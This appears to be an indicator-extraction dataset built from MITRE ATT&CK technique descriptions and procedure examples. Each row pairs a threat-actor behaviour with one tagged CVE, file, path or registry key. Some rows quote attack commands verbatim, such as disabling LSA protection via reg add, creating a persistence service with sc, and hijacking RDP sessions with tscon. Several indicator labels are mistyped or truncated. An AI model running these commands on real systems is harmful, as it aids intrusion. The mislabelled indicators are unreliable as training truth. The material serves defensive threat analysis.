T1190,Exploit Public-Facing Application,"Dragonfly  has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.   [20]",Procedure Examples,cve,CVE-2018-13379
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-26855
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-26858
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-26857
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-27065
T1190,Exploit Public-Facing Application,"Kimsuky  has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.   [36]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-44228
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-31207
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-34473
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-34523
T1190,Exploit Public-Facing Application,MuddyWater  has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).   [42],Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"Rocke  exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.   [46]      [47]",Procedure Examples,cve,CVE-2017-3066
T1190,Exploit Public-Facing Application,"Rocke  exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.   [46]      [47]",Procedure Examples,cve,CVE-2017-10271
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-26857
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-27065
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-26855
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-26858
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2019-0604
T1190,Exploit Public-Facing Application,"ZxShell  has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.   [54]",Procedure Examples,cve,CVE-2013-3163
T1190,Exploit Public-Facing Application,"ZxShell  has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.   [54]",Procedure Examples,cve,CVE-2011-2462
T1190,Exploit Public-Facing Application,"ZxShell  has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.   [54]",Procedure Examples,cve,CVE-2014-0322
T1082,System Information Discovery,JHUHUGIT  obtains a build identifier as well as victim hard drive information from Windows registry key  HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum . Another  JHUHUGIT  variant gathers the victim storage volume serial number and the storage device name.   [173]      [174],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
T1082,System Information Discovery,KOCTOPUS  has checked the OS version using  wmic.exe  and the  find  command.   [190],Procedure Examples,file,wmic.exe
T1082,System Information Discovery,"During  Operation Honeybee , the threat actors collected the computer name, OS, and other system information using  cmd /c systeminfo &gt; %temp%\ temp.ini .   [257]",Procedure Examples,path,/c systeminfo &gt; %temp%\ temp.ini
T1547,Boot or Logon Autostart Execution,BoxCaon  established persistence by setting the  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load  registry key to point to its executable.   [6],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
T1547,Boot or Logon Autostart Execution,"Mis-Type  has created registry keys for persistence, including  HKCU\Software\bkfouerioyou ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier} .   [8]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Active Setup\Installed
T1547,Boot or Logon Autostart Execution,"Mis-Type  has created registry keys for persistence, including  HKCU\Software\bkfouerioyou ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier} .   [8]",Procedure Examples,registry-key,HKCU\Software\bkfouerioyou
T1547,Boot or Logon Autostart Execution,"Mis-Type  has created registry keys for persistence, including  HKCU\Software\bkfouerioyou ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier} .   [8]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Active
T1547,Boot or Logon Autostart Execution,"Misdat  has created registry keys for persistence, including  HKCU\Software\dnimtsoleht\StubPath ,  HKCU\Software\snimtsOleht\StubPath ,  HKCU\Software\Backtsaleht\StubPath ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} .   [8]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Active Setup\Installed
T1547,Boot or Logon Autostart Execution,"Misdat  has created registry keys for persistence, including  HKCU\Software\dnimtsoleht\StubPath ,  HKCU\Software\snimtsOleht\StubPath ,  HKCU\Software\Backtsaleht\StubPath ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} .   [8]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Active Setup\Installed.
T1547,Boot or Logon Autostart Execution,"Misdat  has created registry keys for persistence, including  HKCU\Software\dnimtsoleht\StubPath ,  HKCU\Software\snimtsOleht\StubPath ,  HKCU\Software\Backtsaleht\StubPath ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} .   [8]",Procedure Examples,registry-key,HKCU\Software\dnimtsoleht\StubPath
T1547,Boot or Logon Autostart Execution,"Misdat  has created registry keys for persistence, including  HKCU\Software\dnimtsoleht\StubPath ,  HKCU\Software\snimtsOleht\StubPath ,  HKCU\Software\Backtsaleht\StubPath ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} .   [8]",Procedure Examples,registry-key,HKCU\Software\snimtsOleht\StubPath
T1547,Boot or Logon Autostart Execution,"Misdat  has created registry keys for persistence, including  HKCU\Software\dnimtsoleht\StubPath ,  HKCU\Software\snimtsOleht\StubPath ,  HKCU\Software\Backtsaleht\StubPath ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} .   [8]",Procedure Examples,registry-key,HKCU\Software\Backtsaleht\StubPath
T1547,Boot or Logon Autostart Execution,"Misdat  has created registry keys for persistence, including  HKCU\Software\dnimtsoleht\StubPath ,  HKCU\Software\snimtsOleht\StubPath ,  HKCU\Software\Backtsaleht\StubPath ,  HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7} , and  HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905} .   [8]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Active
T1547,Boot or Logon Autostart Execution,xCaon  has added persistence via the Registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load  which causes the malware to run each time any user logs in.   [6],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
T1505.004,IIS Components,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions:  Get{Extension/Filter}Version ,  Http{Extension/Filter}Proc , and (optionally)  Terminate{Extension/Filter} . IIS modules may also be installed to extend IIS web servers.   [1]      [2]      [3]      [4]      Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.   [2]      [1]      [5]      [6]      [4]      [7]      Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports  RegisterModule , or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.   [8]      [4]      [9]",Description,domain,asp.net
T1505.004,IIS Components,OwaAuth  has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.   [6],Procedure Examples,file,owaauth.dll
T1505.004,IIS Components,OwaAuth  has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.   [6],Procedure Examples,file,w3wp.exe
T1562,Impair Defenses,"Magic Hound  has disabled LSA protection on compromised hosts using  ""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f .   [1]",Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\LSA
T1563.002,RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).   [1]      Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console,  c:\windows\system32\tscon.exe [session number to be stolen] , an adversary can hijack a session without the need for credentials or prompts to the user.   [2]    This can be done remotely or locally and with active or disconnected sessions.   [3]    It can also lead to  Remote System Discovery  and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.   [4]",Description,path,c:\windows\system32\tscon.exe
T1563.002,RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).   [1]      Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console,  c:\windows\system32\tscon.exe [session number to be stolen] , an adversary can hijack a session without the need for credentials or prompts to the user.   [2]    This can be done remotely or locally and with active or disconnected sessions.   [3]    It can also lead to  Remote System Discovery  and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.   [4]",Description,file,tscon.exe
T1562.004,Disable or Modify System Firewall,"PyDCrypt  has modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections using  netsh.exe  on remote machines.   [23]",Procedure Examples,file,netsh.exe
T1562.004,Disable or Modify System Firewall,ZxShell  can disable the firewall by modifying the registry key  HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile .   [35],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
T1218.004,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.    [1]    The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:  C:\Windows\Microsoft.NET\Framework\v \InstallUtil.exe   and  C:\Windows\Microsoft.NET\Framework64\v \InstallUtil.exe  .   InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  [System.ComponentModel.RunInstaller(true)] .    [2],Description,domain,microsoft.net
T1218.004,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.    [1]    The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:  C:\Windows\Microsoft.NET\Framework\v \InstallUtil.exe   and  C:\Windows\Microsoft.NET\Framework64\v \InstallUtil.exe  .   InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  [System.ComponentModel.RunInstaller(true)] .    [2],Description,path,C:\Windows\Microsoft.NET
T1218.004,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.    [1]    The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:  C:\Windows\Microsoft.NET\Framework\v \InstallUtil.exe   and  C:\Windows\Microsoft.NET\Framework64\v \InstallUtil.exe  .   InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  [System.ComponentModel.RunInstaller(true)] .    [2],Description,file,InstallUtil.exe
T1218.004,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.    [1]    The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:  C:\Windows\Microsoft.NET\Framework\v \InstallUtil.exe   and  C:\Windows\Microsoft.NET\Framework64\v \InstallUtil.exe  .   InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  [System.ComponentModel.RunInstaller(true)] .    [2],Description,path,C:\Windows\Microsoft.NET\Framework\v
T1218.004,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.    [1]    The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:  C:\Windows\Microsoft.NET\Framework\v \InstallUtil.exe   and  C:\Windows\Microsoft.NET\Framework64\v \InstallUtil.exe  .   InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  [System.ComponentModel.RunInstaller(true)] .    [2],Description,path,C:\Windows\Microsoft.NET\Framework64\v
T1218.004,InstallUtil,menuPass  has used  InstallUtil.exe  to execute malicious software.   [4],Procedure Examples,file,InstallUtil.exe
T1218.004,InstallUtil,Mustang Panda  has used  InstallUtil.exe  to execute a malicious Beacon stager.   [5],Procedure Examples,file,InstallUtil.exe
T1218.004,InstallUtil,Saint Bot  had used  InstallUtil.exe  to download and deploy executables.   [6],Procedure Examples,file,InstallUtil.exe
T1218.004,InstallUtil,WhisperGate  has used  InstallUtil.exe  as part of its process to disable Windows Defender.   [7],Procedure Examples,file,InstallUtil.exe
T1021.002,SMB or Windows Admin Shares,Deep Panda  uses net.exe to connect to network shares using  net use  commands with compromised credentials.   [19],Procedure Examples,file,net.exe
T1021.002,SMB or Windows Admin Shares,"During  Operation Wocao , threat actors used  Impacket 's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.   [39]",Procedure Examples,domain,smbexec.py
T1543.003,Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.   [1]    Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.   Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.    Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex:  .sys ) to disk, the payload can be loaded and registered via  Native API  functions such as  CreateServiceW()  (or manually via functions such as  ZwLoadDriver()  and  ZwSetValueKey() ), by creating the required service Registry values (i.e.  Modify Registry ), or by using command-line utilities such as  PnPUtil.exe .   [2]      [3]      [4]    Adversaries may leverage these drivers as  Rootkit s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of  Exploitation for Privilege Escalation .   [5]      [4]      Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through  Service Execution . To make detection analysis more challenging, malicious services may also incorporate  Masquerade Task or Service  (ex: using a service and/or payload name related to a legitimate OS or benign software component).",Description,file,sc.exe
T1543.003,Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.   [1]    Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.   Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.    Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex:  .sys ) to disk, the payload can be loaded and registered via  Native API  functions such as  CreateServiceW()  (or manually via functions such as  ZwLoadDriver()  and  ZwSetValueKey() ), by creating the required service Registry values (i.e.  Modify Registry ), or by using command-line utilities such as  PnPUtil.exe .   [2]      [3]      [4]    Adversaries may leverage these drivers as  Rootkit s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of  Exploitation for Privilege Escalation .   [5]      [4]      Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through  Service Execution . To make detection analysis more challenging, malicious services may also incorporate  Masquerade Task or Service  (ex: using a service and/or payload name related to a legitimate OS or benign software component).",Description,file,PnPUtil.exe
T1543.003,Windows Service,FunnyDream  has established persistence by running  sc.exe  and by setting the  WSearch  service to run automatically.   [52],Procedure Examples,file,sc.exe
T1543.003,Windows Service,Gelsemium  can drop itself in  C:\Windows\System32\spool\prtprocs\x64\winprint.dll  as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.   [53],Procedure Examples,path,C:\Windows\System32\spool\prtprocs\x64\winprint.dll
T1543.003,Windows Service,Gelsemium  can drop itself in  C:\Windows\System32\spool\prtprocs\x64\winprint.dll  as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.   [53],Procedure Examples,file,winprint.dll
T1543.003,Windows Service,Ragnar Locker  has used sc.exe to create a new service for the VirtualBox driver.   [97],Procedure Examples,file,sc.exe
T1543.003,Windows Service,"STARWHALE  has the ability to create the following Windows service to establish persistence on an infected host:  sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem"" .   [110]",Procedure Examples,path,/c cscript.exe
T1543.003,Windows Service,"STARWHALE  has the ability to create the following Windows service to establish persistence on an infected host:  sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem"" .   [110]",Procedure Examples,path,c:\\windows\\system32\\w7_1.wsf
T1543.003,Windows Service,"STARWHALE  has the ability to create the following Windows service to establish persistence on an infected host:  sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem"" .   [110]",Procedure Examples,file,cmd.exe
T1543.003,Windows Service,"STARWHALE  has the ability to create the following Windows service to establish persistence on an infected host:  sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem"" .   [110]",Procedure Examples,file,cscript.exe
T1543.003,Windows Service,"Wingbird  uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file.   [132]      [133]",Procedure Examples,file,services.exe
T1543.003,Windows Service,"Wingbird  uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file.   [132]      [133]",Procedure Examples,file,lsass.exe
T1018,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as   Ping  or  net view  using  Net .   Adversaries may also analyze data from local host files (ex:  C:\Windows\System32\Drivers\etc\hosts  or  /etc/hosts ) or other passive means (such as local  Arp  cache entries) in order to discover the presence of remote systems in an environment.   Adversaries may also target discovery of network infrastructure as well as leverage  Network Device CLI  commands on network devices to gather detailed information about systems within a network (e.g.  show cdp neighbors ,  show arp ).   [1]      [2]",Description,path,C:\Windows\System32\Drivers\etc\hosts
T1018,Remote System Discovery,"FIN6  used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.   [36]",Procedure Examples,file,osql.exe
T1018,Remote System Discovery,FIN8  has used  dsquery  and other Active Directory utilities to enumerate hosts; they have also used  nltest.exe /dclist  to retrieve a list of domain controllers.   [37]      [38],Procedure Examples,file,nltest.exe
T1048,Exfiltration Over Alternative Protocol,PoetRAT  has used a .NET tool named dog.exe to exiltrate information over an e-mail account.   [7],Procedure Examples,file,dog.exe
T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable  Pass the Ticket . Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as ""realms"", there are three basic participants: client, service, and Key Distribution Center (KDC).   [1]    Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.   On Windows, the built-in  klist  utility can be used to list and analyze cached Kerberos tickets.   [2]      Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.   [3]    On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in  /var/lib/sss/secrets/secrets.ldb  as well as the corresponding key located in  /var/lib/sss/secrets/.secrets.mkey . Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for  Pass the Ticket . The ccache file may also be converted into a Windows format using tools such as Kekeo.   [4]      [5]      [6]      Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the  /etc/krb5.conf  configuration file and the  KRB5CCNAME  environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using  kinit ,  klist ,  ktutil , and  kcc  built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.   [7]      [8]",Description,path,/etc/krb5.conf
T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable  Pass the Ticket . Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as ""realms"", there are three basic participants: client, service, and Key Distribution Center (KDC).   [1]    Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.   On Windows, the built-in  klist  utility can be used to list and analyze cached Kerberos tickets.   [2]      Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.   [3]    On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in  /var/lib/sss/secrets/secrets.ldb  as well as the corresponding key located in  /var/lib/sss/secrets/.secrets.mkey . Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for  Pass the Ticket . The ccache file may also be converted into a Windows format using tools such as Kekeo.   [4]      [5]      [6]      Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the  /etc/krb5.conf  configuration file and the  KRB5CCNAME  environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using  kinit ,  klist ,  ktutil , and  kcc  built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.   [7]      [8]",Description,path,/var/lib/sss/secrets/secrets.ldb
T1137.004,Outlook Home Page,OilRig  has abused the Outlook Home Page feature for persistence.  OilRig  has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.   [2],Procedure Examples,cve,CVE-2017-11774
T1547.010,Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the  AddMonitor  API call to set a DLL to be loaded at startup.   [1]    This DLL can be located in  C:\Windows\System32  and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.   [2]    Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to  HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors .    The Registry key contains entries for the following:   Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",Description,path,"C:\Windows\System32  and will be loaded by the print spooler service, spoolsv.exe"
